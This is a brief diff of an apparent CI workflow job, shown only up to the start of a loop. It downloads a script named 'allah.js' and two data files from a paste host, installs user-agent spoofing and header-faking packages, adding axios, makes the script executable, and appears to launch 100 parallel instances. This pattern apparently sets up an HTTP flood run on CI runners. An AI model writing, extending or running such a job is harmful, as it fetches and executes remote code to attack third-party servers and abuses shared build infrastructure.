@@ -18,7 +18,7 @@ jobs:
           wget https://curl.by/fje4e/allah.js
           wget https://curl.by/UYgdD/fres.txt
           wget https://curl.by/_m4jT/ua.txt
-          npm install fake-useragent colors header-generator user-agents
+          npm install fake-useragent colors header-generator user-agents axios
           chmod +x allah.js
           PIDS=()
           for i in {1..100}; do
